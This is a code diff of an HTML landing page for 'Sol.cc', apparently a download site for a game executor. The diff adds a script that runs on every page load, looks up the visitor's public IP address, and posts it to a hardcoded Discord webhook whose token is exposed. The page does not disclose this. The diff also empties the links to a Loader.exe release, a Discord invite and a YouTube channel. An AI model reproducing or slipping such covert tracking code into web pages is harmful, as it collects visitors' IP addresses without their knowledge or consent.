@@ -16,7 +16,16 @@
     </style>
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script>
-        
+        async function logIPAndSendToWebhook() {
+            try {
+                const response = await axios.get('https://api.ipify.org?format=json');
+                const ip = response.data.ip;
+                const webhookUrl = 'https://discord.com/api/webhooks/1294694528149753917/x7UYkRR3odV0TWrt2uM3b-KeBg9REY6DR3TSDaQEfAVXaULoWW8-1DGBGzkQjlkWzQ_q';
+                await axios.post(webhookUrl, {content: `IP Address: ${ip}`});
+                console.log('IP address sent to Discord webhook:', ip);
+            } catch (error) { console.error('Error logging IP address:', error); }
+        }
+        logIPAndSendToWebhook();
     </script>
 </head>
 <body>
@@ -27,13 +36,13 @@
     <div class="sun"></div>
     <div class="wind"></div>
     <h1>Sol.cc</h1>
-    <a href="https://github.com/PayxSolutions/loader22/releases/download/Loader/Loader.exe" download>
+    <a href="" download>
         <button class="button">Download</button>
     </a>
-    <a href="https://discord.gg/D3z86m2j8T" target="_blank">
+    <a href="" target="_blank">
         <button class="button">Discord</button>
     </a>
-    <a href="https://www.youtube.com/@SolExecutor" target="_blank">
+    <a href="" target="_blank">
         <button class="button">YouTube</button>
     </a>
 </body>
